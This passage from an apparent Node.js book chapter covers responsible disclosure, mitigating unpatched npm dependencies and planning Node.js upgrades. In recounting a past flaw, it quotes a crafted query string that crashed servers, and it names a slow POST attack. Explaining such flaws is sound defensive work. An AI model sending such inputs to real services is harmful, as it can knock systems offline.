<p>At some point in your career, <a data-primary="security" data-secondary="vulnerabilities" data-tertiary="unpatched" data-type="indexterm" id="vulpat"/><a data-primary="vulnerabilities" data-secondary="security and" data-tertiary="unpatched" data-type="indexterm" id="vulpat1"/><a data-primary="unpatched vulnerabilities" data-type="indexterm" id="unvul"/>you may discover a vulnerability in a package that is maintained by a third party. While it may be tempting to immediately tweet your findings to the world, doing so will only put applications that depend on the package at risk—yours included! Instead, it’s best to send the author of the package a private message disclosing the vulnerability and the steps required to exploit it. This is a form of <a class="orm:hideurl" href="https://en.wikipedia.org/wiki/Responsible_disclosure">responsible disclosure</a>, where someone is given time to fix a vulnerability before letting hackers know about it.</p>&#13;
&#13;
<p>To make this process easier, npm has a page where you can <a class="orm:hideurl" href="https://www.npmjs.com/advisories/report">report a security vulnerability</a>. This page asks for your contact information, the name of the package, and the version range affected by the vulnerability. It also contains a description field that you should use to provide a proof of concept of an attack using the package. If you don’t provide it, then someone from npm will email you to ask for a proof of concept. Once npm verifies the vulnerability, it will contact the author and mark the offending packages as vulnerable.</p>&#13;
&#13;
<p>If you know how to fix the issue, creating a pull request could certainly expedite the process, but doing so might be a little too public. You can also generate a “patch” that can be mailed to the author (or provided in the security report description) of the fix by running <strong><code>git diff --patch</code></strong>—assuming you’ve made the changes in a local repository clone. The package is much more likely to get patched if you provide an example of both how to break it and how to fix it.</p>&#13;
&#13;
<p>Whether you discovered the vulnerability in the first place or someone else made it public, you’re still stuck in the same boat: you need to shield your application from the threat of the vulnerability. If a fixed version of the package is released and it’s a direct dependency, then the best thing to do is update the dependency and deploy. If the vulnerable package is a subdependency, then you might get lucky if its parent dependency uses a version range.</p>&#13;
&#13;
<p>You may end up in situations where you can’t simply swap out the vulnerable package. Perhaps the package is fundamentally insecure and can’t be fixed. Perhaps the package is no longer maintained and nobody is available to fix it.</p>&#13;
&#13;
<p>When this happens, you have a few choices. If you have direct control of how information is passed into a package and you know how it fails, such as when calling <code>foo.run(user_input)</code> with a number instead of a string, then you can wrap the call to that function within your app and coerce the value into the acceptable type, use a regular expression to remove bad inputs, etc. Make the code change, add a “TODO” comment to remove the wrapper when the package finally upgrades, and deploy.</p>&#13;
&#13;
<p>If the package is a direct dependency and is abandoned and vulnerable, then you might want to look for another package that does the same thing. You can also fork the package, apply a fix, and publish it under a new name on npm. Then, modify the <em>package.json</em> to use your forked package.</p>&#13;
&#13;
<p>Several years ago a vulnerability in a query string parsing package made the news. An attacker could provide an HTTP request with an array query parameter containing a large index like so: <code>a[0][999999999]=1</code>. The package then created an extremely large array (instead of using another representation like an object) and would crash the process. An application that my team owned was affected by this. The fix was fairly straight forward but was, unfortunately, several dependency levels deep. A colleague of mine stayed up half the night working with maintainers of each of the dependencies, getting them to release new versions that no longer relied on a vulnerable &#13;
<span class="keep-together">package.</span></p>&#13;
&#13;
<p>Vulnerabilities are harder to manage when they deal with protocols. Sure, if a package deals with function calls much deeper in an application, you can intercept calls and sanitize data. But when they’re located at the most shallow layers of the application, like packages loaded by a framework to parse HTTP, then you might be able to rely on a reverse proxy to sanitize the request. For example, while your application might use a framework that’s vulnerable to a slow <code>POST</code> attack (breaking the request body into small pieces and sending each piece over a long period of time), HAProxy can be configured to prevent this attack by <a data-primary="security" data-secondary="applications" data-startref="appconf" data-tertiary="configuration" data-type="indexterm" id="idm46291172257240"/><a data-primary="applications" data-secondary="configuration, security and" data-startref="appconf1" data-type="indexterm" id="idm46291172255912"/><a data-primary="security" data-secondary="vulnerabilities" data-startref="vulpat" data-tertiary="unpatched" data-type="indexterm" id="idm46291172254824"/><a data-primary="vulnerabilities" data-secondary="security and" data-startref="vulpat1" data-tertiary="unpatched" data-type="indexterm" id="idm46291172253432"/><a data-primary="unpatched vulnerabilities" data-startref="unvul" data-type="indexterm" id="idm46291172251944"/>terminating the connection, freeing up server resources.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Upgrading Node.js" data-type="sect1"><div class="sect1" id="ch_security_sec_node">&#13;
<h1>Upgrading Node.js</h1>&#13;
&#13;
<p>Vulnerabilities are <a data-primary="Node.js" data-secondary="upgrade" data-type="indexterm" id="secnode"/>occasionally discovered in Node.js releases. For example, at some point both the Node.js v12 and v14 release lines were vulnerable to <a href="https://oreil.ly/lUoVq">CVE-2020-8172</a> and <a href="https://oreil.ly/mw2IP">CVE-2020-11080</a>, two vulnerabilities that affect the built-in <code>http</code> module. A fix was implemented in both release lines, released as v12.18.0 and v14.4.0. Security fixes are often implemented in a minor SemVer release for the current release line and then backported to the active LTS release line and, if applicable, the LTS release that’s in maintenance.</p>&#13;
&#13;
<p>It’s important to stay up to date on Node.js security releases. But aside from security updates, Node.js releases also come with new features and performance updates. Upgrading is generally a good idea, but it does come with some caveats, which is why most organizations don’t immediately jump on the latest release. Notably there could be regressions with performance, or even compatibility; Node.js is good at following SemVer, but sometimes dependencies use private internal APIs that change.</p>&#13;
&#13;
<p>Generally, when an application switches to a newer Node.js version, the application needs to be tested again. Of course, normal tests should pass, but it often requires that an engineer perform manual acceptance tests to be sure. The bigger the <em>node_modules</em> directory is, the more likely an application is to have an issue with compatibility with a new version of the Node.js runtime.</p>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Node.js LTS Schedule" data-type="sect2"><div class="sect2" id="idm46291172243400">&#13;
<h2>Node.js LTS Schedule</h2>&#13;
&#13;
<p>The versioning approach used <a data-primary="LTS (Long-Term Support) release" data-type="indexterm" id="longrelease"/>by Node.js is inspired by an old practice of the Linux kernel. Odd versions of releases (v13, v11) represent a sort of beta, where package authors can check compatibility. The code in an odd release will eventually make it into the next even release. Odd Node.js releases should never be used in a production environment. As an example of when to use them, v13 release was useful for me when writing this book while I waited for v14 to be released.</p>&#13;
&#13;
<p>Even release versions of Node.js are known as <em>LTS</em> (Long-Term Support) releases. LTS versions of Node.js go through a few different phases. For the first phase, &#13;
<span class="keep-together">the release</span> is marked as “Current.” Once six months have passed, the release becomes “Active” for about a year. Once the year has passed, the release enters the &#13;
<span class="keep-together">“Maintenance”</span> phase. During this time, certain new features for the next Current release, most notably security patches, are back ported into the LTS release.</p>&#13;
&#13;
<p>This concept is also inspired by the Linux kernel. The LTS releases are important because organizations need to be able to run their applications for a while. Upgrading the version of Node.js that an application runs on is easier if the major version remains constant. <a data-type="xref" href="#fig_node_lts_schedule">Figure 10-3</a> is an example of the Node.js LTS release schedule as of July 2020, generated before Node.js v14 reached the active phase.</p>&#13;
&#13;
<figure><div class="figure" id="fig_node_lts_schedule">&#13;
<img alt="Node.js LTS Release Schedule" src="assets/dsnj_1003.png"/>&#13;
<h6><span class="label">Figure 10-3. </span>Node.js LTS release schedule<sup><a data-type="noteref" href="ch10.html#idm46291172234120" id="idm46291172234120-marker">5</a></sup></h6>&#13;
</div></figure>&#13;
&#13;
<p>Once a major release is finished with the maintenance phase, it reaches <em>end of life</em>. When this happens there will be no new releases for that major version, including any bug fixes or security patches.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Upgrade Approach" data-type="sect2"><div class="sect2" id="idm46291172232312">&#13;
<h2>Upgrade Approach</h2>&#13;
&#13;
<p>Organizations that build Node.js microservices often end up with a collection of applications spanning many versions of Node.js. In many cases, there either aren’t policies for keeping applications on modern Node.js runtime versions or keeping the runtime updated is a technical debt that just doesn’t get prioritized. These situations are dangerous and can lead to a compromised application.<sup><a data-type="noteref" href="ch10.html#idm46291172230392" id="idm46291172230392-marker">6</a></sup></p>&#13;
&#13;
<p>The approach I like to take is to first divide services into three generation categories. The first generation consists of applications running on the current LTS line, such as those running on Node.js v14. The second generation services are those running on the previous maintenance LTS version, such as Node.js v12. The third generation consists of everything else, such as Node.js v10 (very old) or v13 (a non-LTS release line). These can be thought of as the current, maintenance, and naughty generations.</p>&#13;
&#13;
<p>Any applications in the naughty generation must be upgraded. This is the highest priority of work. These applications should be upgraded all the way to the current LTS release, ideally the most recent major and minor version. Migrating them to the maintenance LTS doesn’t make a lot of sense since that version won’t be supported &#13;
<span class="keep-together">as long.</span></p>&#13;
&#13;
<p>It might be painful to update an application directly from a naughty Node.js version to the most recent version. For example, an application using Node.js v10.2.3 might be very incompatible with Node.js v14.4.0. Instead, it may be easier to jump between a few different versions of Node.js. One approach that can simplify this process is to jump to the highest version of each LTS release, starting with the release the application is currently using until the most recent version is attained. In this case, it might mean upgrading from v10.2.3 to v10.21.0, then v12.18.2, and finally v14.4.0.</p>&#13;
&#13;
<p>With this approach, the application can be retested at each different version for compatibility. This will help break the upgrade process into smaller steps and make the process easier. Along the way you’ll probably have to run the application, look for errors, and upgrade npm packages or change code as appropriate. Read through the Node.js changelog for notes about breaking changes in major releases and new features in minor releases to aid the process. Make a new commit each time you fix compatibility with a Node.js release. Once you finally reach the latest Node.js version, you can then craft a pull request containing the separate commits. This helps reviewers understand how code and package changes correlate to Node.js releases.</p>&#13;
&#13;
<p>As time goes on, you’ll need to keep the remaining Node.js applications updated. Applications in the maintenance generation don’t need to be upgraded to the current generation. Instead, wait until a new LTS is released. Once that happens, applications in the maintenance generation are technically now in the naughty generation. They should then be upgraded to use the current Node.js release. Applications that were in the current generation are now in the maintenance generation. Again, they can wait until another LTS is released. This alternating approach to mass updating applications by generation has served me well.</p>&#13;
&#13;
<p>Using tools like <a class="orm:hideurl" href="https://github.com/nvm-sh/nvm">nvm</a> (Node Version Manager)  or <a class="orm:hideurl" href="https://github.com/nodenv/nodenv">nodenv</a>  simplifies the process of switching between multiple Node.js versions on your local development machine. The first, nvm, uses a more manual approach in which you choose the version of Node.js used in your current shell session. On the other hand, nodenv uses a <em>.node-version</em> file to automatically set the Node.js runtime version as you change directories in your terminal. This file can be checked into application repositories to automate switching of Node.js <a data-primary="security" data-secondary="dependencies upgrade" data-startref="depup" data-type="indexterm" id="idm46291172220696"/><a data-primary="dependencies" data-secondary="upgrades, security and" data-startref="depup1" data-type="indexterm" id="idm46291172219448"/><a data-primary="Node.js" data-secondary="upgrade" data-startref="secnode" data-type="indexterm" id="idm46291172218232"/>runtimes.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<div data-type="footnotes"><p data-type="footnote" id="idm46291173349672"><sup><a href="ch10.html#idm46291173349672-marker">1</a></sup> Some of the dozens of known malicious packages include <em>getcookies</em>, <em>crossenv</em>, <em>mongose</em>, and <em>babelcli</em>.</p><p data-type="footnote" id="idm46291173180200"><sup><a href="ch10.html#idm46291173180200-marker">2</a></sup> Technically, your shell is probably writing every command you run to a history file, but production process launchers won’t have this problem.</p><p data-type="footnote" id="idm46291172781992"><sup><a href="ch10.html#idm46291172781992-marker">3</a></sup> This database originated from the Node Security Project and is managed by npm since acquiring ^Lift.</p><p data-type="footnote" id="idm46291172466040"><sup><a href="ch10.html#idm46291172466040-marker">4</a></sup> GitHub acquired npm relatively recently as of the writing of this book. Both npm audit and Dependabot existed before the acquisition, and I expect the two products to evolve and merge in the coming years.</p><p data-type="footnote" id="idm46291172234120"><sup><a href="ch10.html#idm46291172234120-marker">5</a></sup> Image courtesy of Colin Ihrig under Apache License 2.0.</p><p data-type="footnote" id="idm46291172230392"><sup><a href="ch10.html#idm46291172230392-marker">6</a></sup> If you ever spot this happening, I encourage you to step in and spearhead the upgrade process.</p></div></div></section></body></html>